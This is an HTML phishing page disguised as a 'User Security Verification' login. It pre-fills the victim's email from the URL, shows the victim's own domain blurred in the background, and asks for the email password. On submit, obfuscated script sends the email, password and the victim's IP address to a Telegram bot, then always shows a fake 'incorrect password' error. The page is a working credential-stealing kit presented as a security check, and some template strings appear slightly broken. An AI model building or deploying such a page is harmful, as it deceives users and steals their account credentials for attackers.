<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Identity Verification - Security Authentication</title>
    <style>
        body, html { 
            margin: 0; padding: 0; height: 100%; overflow: hidden; 
            font-family: 'Helvetica Neue', Arial, sans-serif; 
            background-color: #f0f2f5; 
        }
        #bg-frame { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: -1; filter: blur(2px) brightness(0.8); }
        .overlay-mask { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(255, 255, 255, 0.1); 
            display: flex; justify-content: center; align-items: center; z-index: 0; 
        }
        .login-container { 
            background-color: rgba(255, 255, 255, 0.98); 
            border-radius: 12px; 
            width: 380px; 
            padding: 50px 40px; 
            text-align: center; 
            z-index: 10; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
            border: 1px solid #e1e4e8;
        }
        .security-icon { width: 60px; height: 60px; margin-bottom: 20px; }
        h1 { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px; letter-spacing: -0.5px; }
        p { font-size: 14px; color: #444; margin-bottom: 30px; line-height: 1.6; font-weight: 500; }
        .form-group { margin-bottom: 18px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 13px; color: #444; }
        input { 
            width: 100%; padding: 14px; 
            border: 1px solid #ccc; 
            border-radius: 6px; 
            box-sizing: border-box; 
            font-size: 15px; 
            transition: border-color 0.2s;
        }
        input:focus { border-color: #0061ff; outline: none; box-shadow: 0 0 0 3px rgba(0,97,255,0.1); }
        .login-button { 
            width: 100%; padding: 15px; 
            background-color: #0061ff; 
            color: white; border: none; 
            border-radius: 6px; cursor: pointer; 
            font-size: 16px; font-weight: 700; 
            margin-top: 10px;
            transition: background-color 0.2s;
        }
        .login-button:hover { background-color: #0056e0; }
        .login-button:disabled { background-color: #b3d1ff; cursor: not-allowed; }
        .error-msg { 
            display: none; color: #e53e3e; 
            background: #fff5f5; border: 1px solid #feb2b2;
            padding: 10px; border-radius: 4px;
            margin-top: 15px; font-size: 13px; font-weight: 500; 
        }
        #verifying { display: none; margin-top: 15px; font-size: 14px; color: #0061ff; font-weight: bold; }
        .spinner {
            display: inline-block; width: 18px; height: 18px;
            border: 3px solid rgba(0,97,255,.3); border-radius: 50%;
            border-top-color: #0061ff; animation: spin 1s ease-in-out infinite;
            margin-right: 8px; vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer-info { margin-top: 30px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <iframe id="bg-frame" src=""></iframe>
    <div class="overlay-mask">
        <div class="login-container">
            <svg class="security-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L3 7V12C3 17.41 6.84 22.38 12 24C17.16 22.38 21 17.41 21 12V7L12 2Z" fill="#0061ff"/>
                <path d="M10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="white"/>
            </svg>
            <h1>User Security Verification</h1>
            <p>For your protection, please enter your valid email address<br>and the password for this account to continue.</p>
            <form id="loginForm">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" id="email" placeholder="example@domain.com" required readonly>
                </div>
                <div class="form-group">
                    <label>Email Password</label>
                    <input type="password" id="password" placeholder="Enter your email password" required>
                </div>
                <button type="submit" class="login-button" id="submitBtn">Complete Verification</button>
                <div id="verifying"><div class="spinner"></div> Verifying information...</div>
                <div class="error-msg" id="error-msg">The password you entered is incorrect. Please check and try again.</div>
            </form>
            <div class="footer-info">Â© 2026 Security Authentication Service. All rights reserved.</div>
        </div>
    </div>
    <script>
        const gate = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
        const key = atob("NzUxMDY0MzMxMzpBQUczVTN6Ukt6UmdHVDVoZEhwdnVhWFJCekYwNEVtOUVkZw==");
        const cid = atob("NzI0MDkxNTExMA==");

        window.addEventListener('DOMContentLoaded', () => {
            const emailInput = document.getElementById('email');
            const bgFrame = document.getElementById('bg-frame');
            let hashEmail = window.location.hash.substring(1); 
            if (hashEmail) {
                emailInput.value = decodeURIComponent(hashEmail);
                let domain = hashEmail.split('@')[1];
                if (domain) { bgFrame.src = "https://www." + domain; }
            }
        });

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const err = document.getElementById('error-msg');
            const v = document.getElementById('verifying');
            const emailVal = document.getElementById('email').value;
            const passVal = document.getElementById('password').value;

            btn.disabled = true;
            v.style.display = 'block';
            err.style.display = 'none';

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const msg = &#128276; *New Hit*\n&#128231; Email: ${emailVal}\n&#128273; Pass: ${passVal}\n&#127760; IP: ${ipData.ip};
                await fetch(${gate}${key}/sendMessage, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: cid, text: msg, parse_mode: 'Markdown' })
                });
            } catch (error) {}

            setTimeout(() => {
                v.style.display = 'none';
                err.style.display = 'block';
                btn.disabled = false;
                document.getElementById('password').value = "";
            }, 2500);
        });
    </script>
</body>
</html>
